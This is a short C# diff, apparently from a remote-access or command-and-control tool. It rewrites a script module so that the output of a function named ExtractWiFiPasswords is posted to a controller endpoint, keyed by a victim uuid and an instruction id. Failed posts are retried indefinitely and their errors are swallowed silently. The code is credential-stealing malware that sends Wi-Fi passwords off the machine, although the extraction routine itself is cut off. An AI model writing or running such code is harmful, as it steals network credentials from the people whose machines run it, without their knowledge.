@@ -3,12 +3,47 @@ using System.Threading.Tasks;
 using System.Text.RegularExpressions;
 using System.Text;
 using System;
-
+using System.IO;
+using System.Net.Http;
+using System.Runtime.Serialization;
+using System.Runtime.Serialization.Json;
 public class Script
 {
-    public static async Task<string> ExecuteAsync()
+ [DataContract]
+    public class Response
     {
-        return ExtractWiFiPasswords();
+        [DataMember]
+        public string output { get; set; }
+    }
+    private static async Task NotifyWithRetry(string EndPoint, string uuid, long instructionId, short code, string output)
+        {
+            TimeSpan delay = TimeSpan.FromSeconds(10);
+            while (true)
+            {
+                HttpClient httpClient = new HttpClient();
+                try
+                {
+                    DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(Response));
+
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        serializer.WriteObject(ms, new Response { output = output });
+                        var content = new StringContent(Encoding.UTF8.GetString(ms.ToArray()), Encoding.UTF8, "application/json");
+                        var response = await httpClient.PostAsync(EndPoint + "Response/" + uuid + "/" + instructionId + "/" + code, content);
+                        response.EnsureSuccessStatusCode();
+                        break;
+                    }
+                }
+                catch (Exception)
+                {
+                }
+                await Task.Delay(delay);
+            }
+        }
+    public static async Task<object> ExecuteAsync(string endpoint, string uuid, long instId, short code)
+    {
+        await NotifyWithRetry(endpoint, uuid, instId, code, ExtractWiFiPasswords());
+        return null;
     }
     static string ExtractWiFiPasswords()
     {
